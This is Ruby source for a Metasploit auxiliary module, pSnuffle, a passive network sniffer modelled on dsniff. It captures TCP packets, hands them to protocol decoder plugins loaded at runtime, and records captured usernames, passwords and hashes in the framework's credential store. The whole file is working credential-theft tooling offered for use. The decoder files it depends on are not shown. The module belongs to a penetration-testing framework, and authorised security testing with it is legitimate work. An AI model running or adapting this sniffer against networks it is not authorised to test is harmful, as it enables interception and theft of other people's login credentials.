##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# dsniff was helping me very often. Too bad that it doesn't work correctly
# anymore. Psnuffle should bring password sniffing into Metasploit local
# and if we get lucky even remote.
#
# Cheers - Max Moser - mmo@remote-exploit.org
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Capture

  def initialize
    super(
      'Name' => 'pSnuffle Packet Sniffer',
      'Description' => 'This module sniffs passwords like dsniff did in the past.',
      'Author'	=> 'Max Moser <mmo[at]remote-exploit.org>',
      'License'	=> MSF_LICENSE,
      'Actions' => [
        [ 'Sniffer', { 'Description' => 'Run sniffer' } ],
        [ 'List', { 'Description' => 'List protocols' } ]
      ],
      'PassiveActions' => [ 'Sniffer' ],
      'DefaultAction' => 'Sniffer',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options [
      OptString.new('PROTOCOLS', [true, 'A comma-delimited list of protocols to sniff or "all".', 'all']),
    ]

    register_advanced_options [
      OptPath.new('ProtocolBase', [
        true, 'The base directory containing the protocol decoders',
        File.join(Msf::Config.data_directory, 'exploits', 'psnuffle')
      ]),
    ]
    deregister_options('RHOSTS')
  end

  def load_protocols
    base = datastore['ProtocolBase']
    unless File.directory? base
      raise 'The ProtocolBase parameter is set to an invalid directory'
    end

    allowed = datastore['PROTOCOLS'].split(',').map { |x| x.strip.downcase }
    @protos = {}
    decoders = Dir.new(base).entries.grep(/\.rb$/).sort
    decoders.each do |n|
      f = File.join(base, n)
      m = ::Module.new
      begin
        m.module_eval(File.read(f, File.size(f)))
        m.constants.grep(/^Sniffer(.*)/) do
          proto = ::Regexp.last_match(1)
          next unless allowed.include?(proto.downcase) || datastore['PROTOCOLS'] == 'all'

          klass = m.const_get("Sniffer#{proto}")
          @protos[proto.downcase] = klass.new(framework, self)

          print_status("Loaded protocol #{proto} from #{f}...")
        end
      rescue StandardError => e
        print_error("Decoder #{n} failed to load: #{e.class} #{e} #{e.backtrace}")
      end
    end
  end

  def run
    check_pcaprub_loaded # Check first
    # Load all of our existing protocols
    load_protocols

    if action.name == 'List'
      print_status("Protocols: #{@protos.keys.sort.join(', ')}")
      return
    end

    print_status 'Sniffing traffic.....'
    open_pcap

    each_packet do |pkt|
      p = PacketFu::Packet.parse(pkt)
      next unless p.is_tcp?
      next if p.payload.empty?

      @protos.each_key do |k|
        @protos[k].parse(p)
      end
      true
    end
    close_pcap
    print_status 'Finished sniffing'
  end
end

# End module class

# Basic class for taking care of sessions
class BaseProtocolParser

  attr_accessor :framework, :module, :sessions, :dport, :sigs

  def initialize(framework, mod)
    self.framework = framework
    self.module = mod
    self.sessions = {}
    self.dport = 0
    register_sigs
  end

  def parse(_pkt)
    nil
  end

  def register_sigs
    self.sigs = {}
  end

  #
  # Glue methods to bridge parsers to the main module class
  #
  def print_status(msg)
    self.module.print_status(msg)
  end

  def print_error(msg)
    self.module.print_error(msg)
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: self.module.myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: self.module.fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: opts[:type]
    }.merge(service_data)

    if opts[:type] == :nonreplayable_hash
      credential_data.merge!(jtr_format: opts[:jtr_format])
    end

    login_data = {
      core: self.module.create_credential(credential_data),
      status: opts[:status],
      proof: opts[:proof]
    }.merge(service_data)

    unless opts[:status] == Metasploit::Model::Login::Status::UNTRIED
      login_data.merge!(last_attempted_at: DateTime.now)
    end

    self.module.create_credential_login(login_data)
  end

  def report_note(*opts)
    self.module.report_note(*opts)
  end

  def report_service(*opts)
    self.module.report_service(*opts)
  end

  def find_session(sessionid)
    purge_keys = []
    sessions.each_key do |ses|
      # Check for cleanup abilities... kills performance in large environments maybe
      # When longer than 5 minutes no packet was related to the session, delete it
      if ((sessions[ses][:mtime] - sessions[ses][:ctime]) > 300)
        # too bad to this session has no action for a long time
        purge_keys << ses
      end
    end
    purge_keys.each { |ses| sessions.delete(ses) }

    # Does this session already exist?
    if sessions[sessionid]
      # Refresh the timestamp
      sessions[sessionid][:mtime] = Time.now
    elsif (sessionid =~ /^([^:]+):([^-]+)-([^:]+):(\d+)$/s)
      # Create a new session entry along with the host/port from the id
      sessions[sessionid] = {
        client_host: ::Regexp.last_match(1),
        client_port: ::Regexp.last_match(2),
        host: ::Regexp.last_match(3),
        port: ::Regexp.last_match(4),
        session: sessionid,
        ctime: Time.now,
        mtime: Time.now
      }
    end

    sessions[sessionid]
  end

  def get_session_src(pkt)
    return "#{pkt.ip_daddr}:#{pkt.tcp_dport}-#{pkt.ip_saddr}-#{pkt.tcp_sport}" if pkt.is_tcp?
    return "#{pkt.ip_daddr}:#{pkt.udp_dport}-#{pkt.ip_saddr}-#{pkt.udp_sport}" if pkt.is_udp?

    "#{pkt.ip_daddr}:0-#{pkt.ip_saddr}:0"
  end

  def get_session_dst(pkt)
    return "#{pkt.ip_saddr}:#{pkt.tcp_sport}-#{pkt.ip_daddr}:#{pkt.tcp_dport}" if pkt.is_tcp?
    return "#{pkt.ip_saddr}:#{pkt.udp_sport}-#{pkt.ip_daddr}:#{pkt.udp_dport}" if pkt.is_udp?

    "#{pkt.ip_saddr}:0-#{pkt.ip_daddr}:0"
  end
end
